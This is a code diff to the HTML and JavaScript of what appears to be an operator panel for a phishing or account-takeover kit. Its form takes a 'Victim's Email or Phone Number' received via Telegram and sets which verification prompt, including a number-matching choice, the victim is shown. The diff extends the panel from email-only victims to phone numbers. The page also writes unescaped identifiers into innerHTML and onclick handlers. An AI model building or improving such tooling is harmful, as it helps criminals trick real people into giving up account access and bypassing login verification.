@@ -117,8 +117,9 @@
 
         <form id="verificationForm">
             <div class="form-group">
-                <label for="email">Victim's Email:</label>
-                <input type="email" id="email" required placeholder="Enter the email you received in Telegram">
+                <label for="identifier">Victim's Email or Phone Number:</label>
+                <input type="text" id="identifier" required placeholder="Enter the email or phone number you received in Telegram">
+                <small style="color: #666; font-size: 12px;">Works with both email addresses (user@gmail.com) and phone numbers (+1234567890)</small>
             </div>
 
             <div class="form-group">
@@ -176,11 +177,11 @@
         form.addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const email = document.getElementById('email').value;
+            const identifier = document.getElementById('identifier').value;
             const promptType = document.getElementById('prompt_type').value;
             const number = document.getElementById('number').value;
 
-            let formData = 'email=' + encodeURIComponent(email) + '&prompt_type=' + encodeURIComponent(promptType);
+            let formData = 'identifier=' + encodeURIComponent(identifier) + '&prompt_type=' + encodeURIComponent(promptType);
 
             if (promptType === 'choose_number') {
                 formData += '&number=' + encodeURIComponent(number);
@@ -247,14 +248,15 @@
 
             Object.values(data).forEach(item => {
                 const numberText = item.number !== undefined ? ` | Number: ${item.number}` : '';
+                const identifier = item.identifier || item.email; // Support both old and new data structure
                 const itemDiv = document.createElement('div');
                 itemDiv.className = 'verification-item';
                 itemDiv.innerHTML = `
                     <div>
-                        <strong>${item.email}</strong><br>
+                        <strong>${identifier}</strong><br>
                         <small>Prompt: ${item.prompt_type}${numberText} | Set: ${new Date(item.timestamp * 1000).toLocaleString()}</small>
                     </div>
-                    <button onclick="clearVerification('${item.email}')">Clear</button>
+                    <button onclick="clearVerification('${identifier}')">Clear</button>
                 `;
                 listDiv.appendChild(itemDiv);
             });
